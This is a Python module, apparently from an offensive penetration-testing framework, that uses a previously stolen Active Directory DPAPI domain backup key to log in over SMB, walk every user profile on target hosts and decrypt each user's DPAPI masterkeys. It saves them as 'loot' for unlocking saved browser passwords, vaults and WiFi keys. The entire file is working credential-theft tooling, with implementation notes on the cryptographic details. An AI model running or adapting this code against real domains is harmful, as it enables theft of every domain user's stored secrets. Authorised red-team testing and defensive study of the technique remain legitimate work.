"""DPAPI masterkey looting: every domain user's masterkeys, with the
domain backup key (DPAPI stage 2).

Stage 1 (dpapi_backupkey) pulls the domain's backup key PAIR. This is
the payoff: every domain user who has ever used DPAPI on a machine has
a masterkey file under their profile, and every one of those unwraps
with that ONE key — Chrome credentials, vaults, WiFi keys, saved
everything. This module walks the target's profiles over SMB and
returns the decrypted 64-byte masterkeys (hex, looted), proving each
decrypt rather than trusting the unwrap.

Chain per masterkey file (MS-DPAP; same path dploot and impacket's
dpapi.py example take):

  1. MasterKeyFile parse: Version(4) ... MasterKeyLen, BackupKeyLen,
     CredHistLen, DomainKeyLen — the DomainKey blob holds the
     masterkey itself, RSA-wrapped with the backup key's public half
  2. RSA PKCS1-v1_5 decrypt DomainKey.SecretData with the backup
     private key (CAPI stores the ciphertext little-endian — reverse
     first) -> a DPAPI_DOMAIN_RSA_MASTER_KEY struct; buffer[:cbMasterKey]
     IS the 64-byte masterkey. No PBKDF2/HMAC step on this path —
     that belongs to the user-password MasterKey blob only
  3. Proof: RSA padding must hold and cbMasterKey must be 64 —
     a wrong backup key never gets past both

Domain blobs still need stage 3 (the blobs themselves); this stage
mints the keys that open them.
"""

from core.module import AuxiliaryModule
from core.options import OptAddress, OptPort, OptString

try:
    from Cryptodome.Cipher import PKCS1_v1_5
    from Cryptodome.PublicKey import RSA
    from impacket import dpapi
    from impacket.smbconnection import SMBConnection
except ImportError:
    dpapi = None  # console gates run() on requirements

MASTERKEY_HEX_LEN = 128  # 64 bytes
MASTERKEY_LEN = 64


def is_guid_name(name):
    """Masterkey files are named by their guid. The Protect dir also
    holds BK-<domain> (the cached backup-key public blob) and anything
    else a profile accumulates — only guid-named files are masterkeys."""
    parts = name.split("-")
    if len(parts) != 5:
        return False
    return all(len(p) == n and
               all(c in "0123456789abcdefABCDEF" for c in p)
               for p, n in zip(parts, (8, 4, 4, 4, 12)))


def parse_backup_key_pem(loot_content):
    """RSA key object out of a dpapi-backupkey loot blob (cert + key)."""
    start = loot_content.index("-----BEGIN RSA PRIVATE KEY-----")
    return RSA.import_key(loot_content[start:].encode())


def unwrap_domain_key(domain_key_blob, backup_key):
    """64-byte masterkey straight out of a DomainKey blob: RSA
    PKCS1-v1_5 decrypt of SecretData with the domain backup private
    key. CAPI stores the ciphertext LITTLE-endian — it must be
    reversed before the RSA decrypt (learned live: as-is decrypts to
    empty). The plaintext is a DPAPI_DOMAIN_RSA_MASTER_KEY struct —
    the masterkey is already inside (the MasterKey blob's PBKDF2/HMAC
    dance is the user-password path only, never this one)."""
    dk = dpapi.DomainKey(domain_key_blob)
    sentinel = object()
    plain = PKCS1_v1_5.new(backup_key).decrypt(
        bytes(dk["SecretData"])[::-1], sentinel)
    if plain is sentinel:
        return None
    try:
        dmk = dpapi.DPAPI_DOMAIN_RSA_MASTER_KEY(plain)
    except Exception:
        return None  # wrong key: garbage that slipped past the padding
    if dmk["cbMasterKey"] != MASTERKEY_LEN or \
            len(dmk["buffer"]) < MASTERKEY_LEN:
        return None
    return bytes(dmk["buffer"][:MASTERKEY_LEN])


def decrypt_masterkey_file(data, backup_key):
    """(guid, masterkey) out of a MasterKeyFile blob:
      (guid, key)   — domain masterkey recovered
      (guid, None)  — DomainKey blob present but the backup key
                      didn't fit (wrong key, or the DC re-keyed)
      (None, None)  — no DomainKey blob at all: a LOCAL account's
                      masterkey, out of this module's reach"""
    mkf = dpapi.MasterKeyFile(data)
    if mkf["DomainKeyLen"] <= 0:
        return None, None
    offset = len(mkf)  # blobs start after the 128-byte header
    # layout: MasterKey, BackupKey, CredHist, DomainKey
    dk_start = offset + mkf["MasterKeyLen"] + mkf["BackupKeyLen"] + \
        mkf["CredHistLen"]
    dk_blob = data[dk_start:dk_start + mkf["DomainKeyLen"]]
    masterkey = unwrap_domain_key(dk_blob, backup_key)
    guid = mkf["Guid"].decode("utf-16-le").rstrip("\x00")
    return guid, masterkey


class DpapiMasterkeys(AuxiliaryModule):
    name = "DPAPI Masterkey Loot (domain backup key)"
    description = """
        Walks a target's user profiles over SMB and decrypts every
        domain DPAPI masterkey with the domain backup key (latest
        dpapi-backupkey loot, or KEY_LOOT to pick one). Each key must
        pass RSA padding + structure checks before landing in loot —
        the keys that open every domain DPAPI blob on that box (stage
        3 material: Chrome creds, vaults, WiFi).
    """
    authors = ["you"]
    requirements = ["impacket", "Cryptodome"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target(s) with profiles, "
                                                "comma-separated"))
        self.options.add(OptPort("RPORT", default=445,
                                 description="SMB port"))
        self.options.add(OptString("DOMAIN", default=".",
                                   description="Auth domain ('.' = local)"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Target admin"))
        self.options.add(OptString("PASSWORD", required=True,
                                   description="Password"))
        self.options.add(OptString("KEY_LOOT", default="",
                                   description="dpapi-backupkey loot label "
                                               "(blank = latest)"))

    def run(self):
        store = getattr(self.framework, "store", None)
        backup_key = self._backup_key(store)
        if backup_key is None:
            return
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._loot_host(host, backup_key, store)

    def _backup_key(self, store):
        if store is None:
            self.print_error("no evidence store — need a dpapi-backupkey "
                             "loot (run dpapi_backupkey first)")
            return None
        loot = store.loot("dpapi-backupkey")
        label = str(self.get_option("KEY_LOOT") or "").strip()
        if label:
            loot = [l for l in loot if label in l["label"]]
        if not loot:
            self.print_error("no dpapi-backupkey loot — run "
                             "auxiliary/attack/dpapi_backupkey first")
            return None
        try:
            return parse_backup_key_pem(loot[-1]["content"])
        except Exception as e:
            self.print_error(f"backup key loot didn't parse - {e}")
            return None

    def _loot_host(self, host, backup_key, store):
        try:
            conn = SMBConnection(host, host,
                                 sess_port=int(self.get_option("RPORT")),
                                 timeout=20)
            conn.login(str(self.get_option("USERNAME")),
                       str(self.get_option("PASSWORD")),
                       str(self.get_option("DOMAIN") or "."))
        except Exception as e:
            self.print_error(f"{host}: SMB login failed - {e}")
            return
        try:
            for user_dir in self._list(conn, "Users\\*"):
                if user_dir in (".", "..", "Public", "Default",
                                "Default User", "All Users"):
                    continue
                protect = f"Users\\{user_dir}\\AppData\\Roaming" \
                    "\\Microsoft\\Protect"
                for sid_dir in self._list(conn, f"{protect}\\*"):
                    if sid_dir in (".", ".."):
                        continue
                    self._loot_sid(conn, host, user_dir, protect,
                                   sid_dir, backup_key, store)
        finally:
            conn.close()

    def _loot_sid(self, conn, host, user_dir, protect, sid_dir,
                  backup_key, store):
        found = 0
        for entry in self._list(conn, f"{protect}\\{sid_dir}\\*"):
            if entry in (".", "..", "Preferred") or not is_guid_name(entry):
                continue
            try:
                buf = []
                conn.getFile("C$",
                             f"{protect}\\{sid_dir}\\{entry}", buf.append)
                data = b"".join(buf)
            except Exception:
                continue
            try:
                guid, masterkey = decrypt_masterkey_file(data, backup_key)
            except Exception as e:
                self.print_debug(f"{host}: {user_dir}/{entry}: {e}")
                continue
            if masterkey is None:
                if guid is None:
                    self.print_debug(f"{host}: {user_dir}/{entry}: no "
                                     f"domain backup blob (local account) "
                                     f"— skipped")
                else:
                    self.print_error(f"{host}: {user_dir}/{entry}: backup "
                                     f"key didn't fit (wrong key?)")
                continue
            found += 1
            self.print_good(f"{host}: {user_dir} [{sid_dir}] {guid}: "
                            f"masterkey decrypted")
            if store is not None:
                store.add_loot("masterkey",
                               f"dpapi masterkey {user_dir}/{sid_dir}/"
                               f"{guid} @ {host}",
                               masterkey.hex(), address=host)
        if found:
            self.print_status(f"{host}: {user_dir}: {found} masterkey(s) "
                              f"in loot")

    def _list(self, conn, pattern):
        try:
            return [f.get_longname() for f in conn.listPath("C$", pattern)]
        except Exception:
            return []
